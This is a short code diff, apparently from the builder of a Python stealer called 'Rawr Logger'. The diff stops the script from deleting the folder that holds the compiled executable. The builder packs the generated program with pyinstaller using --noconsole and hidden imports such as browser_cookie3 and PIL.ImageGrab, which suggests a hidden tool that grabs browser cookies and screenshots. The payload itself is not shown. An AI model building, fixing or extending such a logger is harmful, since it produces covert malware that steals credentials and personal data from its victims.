@@ -401,7 +401,6 @@ if prot == 'y':
     if compile == "y":
       os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3" {name}.py')
       shutil.rmtree('build')
-      shutil.rmtree('dist')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
       time.sleep(2)
@@ -419,7 +418,6 @@ elif prot == 'n':
     if compile == "y":
       os.system(f"pyinstaller --onefile --noconsole {name}.py")
       shutil.rmtree('build')
-      shutil.rmtree('dist')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
       time.sleep(2)
